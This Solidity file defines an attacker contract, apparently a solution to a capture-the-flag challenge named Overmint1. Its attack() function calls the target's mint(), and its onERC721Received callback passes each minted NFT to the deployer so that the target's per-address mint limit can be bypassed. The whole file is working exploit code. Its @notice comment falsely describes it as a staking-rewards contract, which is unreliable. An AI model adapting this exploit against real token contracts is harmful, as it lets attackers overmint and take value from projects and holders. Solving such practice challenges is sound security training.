/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Overmint1} from "./Overmint1.sol";

/// @title Overmint1Attacker
/// @notice This contract manage NFT staking feature and its rewards
contract Overmint1Attacker is IERC721Receiver {
  Overmint1 public overmint;
  uint256 supply;
  address private owner;

  constructor(address _overmint1) {
    overmint = Overmint1(_overmint1);
    supply = overmint.totalSupply();
    owner = msg.sender;
  }

  /// @notice an Attack function to call Overmint1 mint() function
  function attack() external {
    overmint.mint();
  }

  /**
   * @dev See {IERC721-onERC721Received}.
   */
  function onERC721Received(
    address, /* operator */
    address from,
    uint256 tokenId,
    bytes calldata /* data */
  ) external returns (bytes4) {
    overmint.safeTransferFrom(address(this), owner, tokenId);
    return IERC721Receiver.onERC721Received.selector;
  }
}
